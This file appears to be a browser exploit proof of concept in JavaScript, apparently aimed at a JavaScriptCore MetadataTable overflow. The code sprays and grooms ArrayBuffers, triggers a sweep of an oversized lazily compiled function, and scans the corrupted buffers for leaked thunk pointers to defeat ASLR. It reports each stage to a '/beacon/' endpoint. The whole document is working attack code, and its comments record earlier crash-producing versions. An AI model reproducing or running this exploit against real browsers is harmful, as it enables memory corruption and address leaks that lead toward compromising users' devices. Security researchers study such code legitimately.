// p502 — MetadataTable overflow: p142-style spray-after-compile
//
// p142 PROVEN: COMPILED-OK + GROOM-DONE + CALLING + SIGSEGV
// p142 compiled FIRST, then sprayed ABs, then called function.
// Calling triggers re-parse → finishCreation → sweep → execution → crash.
//
// V502 improvement over p142:
// 1. Uses if(0) guard to SURVIVE execution (no crash)
// 2. Scans ABs for thunk pointers after sweep completes
// 3. Minimal memory: no pre-spray, compile first to free blob/AST
//
// Memory flow:
//   Script load: 146MB source → lazy parse → COMPILED-OK
//   Blob freed (URL revoked) — but source in SourceProvider stays
//   Spray: 200 × 100,112B = ~20MB
//   Call function: re-parse body → AST (~900MB) → bytecode → finishCreation → sweep
//   Peak: ~146MB source + 20MB spray + 900MB AST ≈ 1066MB < 1200MB
//   After AST freed: ~146MB + 20MB = ~166MB — scan is cheap
//
// Beacon prefix: V502-
(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V502-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hexB(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexB(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═══ Phase 1: Build function blob (lazy parse, low memory) ═══
  var N = 38348816;
  var CHUNK = 4000000;
  var nC = Math.floor(N / CHUNK);
  var rem = N - nC * CHUNK;
  var rep = 'a();'.repeat(CHUNK);

  var parts = new Array(nC + 3);
  parts[0] = 'window.__v502fn=function(a){if(0){';
  for (var c = 0; c < nC; c++) parts[1 + c] = rep;
  parts[nC + 1] = 'a();'.repeat(rem);
  parts[nC + 2] = '}window.__v502ok=1;};';
  rep = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB', 'sz=' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');

  sc.onerror = function() {
    B('SCRIPT-ERR', '');
  };

  sc.onload = function() {
    var ok = window.__v502fn ? 'OK' : 'FAIL';
    B('COMPILED', ok);

    if (ok !== 'OK') {
      B('DONE', 'compile-fail');
      return;
    }

    // Free the blob to reclaim ~146MB of Blob object memory
    // (SourceProvider still holds the source text internally)
    URL.revokeObjectURL(url);
    blob = null;
    sc = null;

    // ═══ Phase 2: Spray ABs with bait-and-switch ═══
    var BUF_SZ = 100112;
    var SPRAY_N = 200;

    var bufs = new Array(SPRAY_N);
    for (var i = 0; i < SPRAY_N; i++) {
      bufs[i] = new ArrayBuffer(BUF_SZ);
    }
    B('SPRAY', 'n=' + SPRAY_N);

    // Transfer first half to create holes
    var xferred = 0;
    for (var i = 0; i < SPRAY_N / 2; i++) {
      try {
        structuredClone(bufs[i], {transfer: [bufs[i]]});
        xferred++;
      } catch(e) {
        if (xferred === 0) { B('XFER-ERR', e.message.substring(0,60)); break; }
      }
      bufs[i] = null;
    }
    B('XFER', 'n=' + xferred);

    // Create views on surviving ABs
    var views = [];
    for (var i = Math.floor(SPRAY_N / 2); i < SPRAY_N; i++) {
      if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
        views.push(new Uint8Array(bufs[i]));
      }
    }
    B('VIEWS', 'n=' + views.length);

    // ═══ Phase 3: GC to free transferred ABs → create holes ═══
    setTimeout(function() {
      for (var g = 0; g < 10; g++) {
        var junk = [];
        for (var j = 0; j < 40000; j++) junk.push({x: j});
        junk = null;
      }
      B('GC-DONE');

      // ═══ Phase 4: Call the function → re-parse → finishCreation → sweep ═══
      // MetadataTable allocation (100,112B) fills a freed hole
      // finishCreation sweeps 4.3GB forward → into surviving ABs
      // if(0) prevents execution crash
      B('CALLING');

      try {
        window.__v502fn(0);
      } catch(e) {
        B('CALL-ERR', e.message ? e.message.substring(0,60) : 'unknown');
      }

      var fnOk = window.__v502ok ? 'OK' : 'FAIL';
      B('CALL-RESULT', fnOk);

      if (fnOk !== 'OK') {
        B('DONE', 'call-fail');
        return;
      }

      // Free the function to reclaim AST/bytecode memory
      window.__v502fn = null;

      setTimeout(doScan, 100);

      function doScan() {
        B('SCAN-START');

        var hitBufs = 0;
        var leakedPtrs = [];

        for (var vi = 0; vi < views.length; vi++) {
          var view = views[vi];
          if (!view) continue;

          // Quick check for non-zero content
          var hasNZ = false;
          for (var q = 0; q < view.length && !hasNZ; q += 4) {
            if (view[q] !== 0 || view[q+1] !== 0 || view[q+2] !== 0 || view[q+3] !== 0) {
              hasNZ = true;
            }
          }
          if (!hasNZ) continue;
          hitBufs++;

          // Count non-zero bytes
          var nz = 0;
          for (var j = 0; j < view.length; j++) {
            if (view[j] !== 0) nz++;
          }
          B('HIT-' + vi, 'nz=' + nz);

          if (hitBufs > 5) break;

          // Find entry alignment by looking for 0xFFFFFFFF sentinel at entry+12
          var bestBase = -1, bestHits = 0;
          for (var tryBase = 0; tryBase < 112; tryBase += 4) {
            var hits = 0;
            for (var off = tryBase + 12; off + 4 <= view.length; off += 112) {
              if (u32(view, off) === 0xFFFFFFFF) hits++;
            }
            if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
          }
          B('EBASE-' + vi, 'base=' + bestBase + ',hits=' + bestHits);

          // Extract thunk pointers at entry+24 (ASLR leak)
          var ptrs = 0;
          for (var eOff = bestBase; eOff + 32 <= view.length && ptrs < 5; eOff += 112) {
            if (u32(view, eOff + 12) !== 0xFFFFFFFF) continue;
            var pOff = eOff + 24;
            if (view[pOff] === 0 && view[pOff+1] === 0 && view[pOff+2] === 0 && view[pOff+3] === 0 &&
                view[pOff+4] === 0 && view[pOff+5] === 0 && view[pOff+6] === 0 && view[pOff+7] === 0) continue;
            var h = hex8(view, pOff);
            B('THUNK-' + ptrs, 'off=' + pOff + ',val=0x' + h);
            if (leakedPtrs.length < 5) leakedPtrs.push(h);
            ptrs++;
          }

          // Check m_bytecodeIndex at entry+68
          var idxs = 0;
          for (var eOff = bestBase; eOff + 72 <= view.length && idxs < 5; eOff += 112) {
            var iOff = eOff + 68;
            var val = u32(view, iOff);
            if (val !== 0 && val !== 0xFFFFFFFF) {
              B('IDX-' + idxs, 'off=' + iOff + ',val=' + val);
              idxs++;
            }
          }

          // Hex dump first 224 bytes of first hit
          if (hitBufs === 1) {
            var chunks = [];
            for (var off = 0; off + 8 <= 224 && off + 8 <= view.length; off += 8) {
              if (view[off]|view[off+1]|view[off+2]|view[off+3]|
                  view[off+4]|view[off+5]|view[off+6]|view[off+7]) {
                chunks.push(off + ':0x' + hex8(view, off));
              }
            }
            if (chunks.length > 0) B('RAW', chunks.slice(0,12).join(' '));
          }
        }

        B('RESULT', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length);

        if (leakedPtrs.length > 0) {
          B('ASLR-LEAK', 'ptr0=0x' + leakedPtrs[0]);
        } else if (hitBufs > 0) {
          B('SWEEP-HIT', 'no-ptrs-extracted');
        } else {
          B('NO-HIT');
        }

        B('DONE', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length);
      }
    }, 500);
  };

  document.head.appendChild(sc);
  sc.src = url;
})();
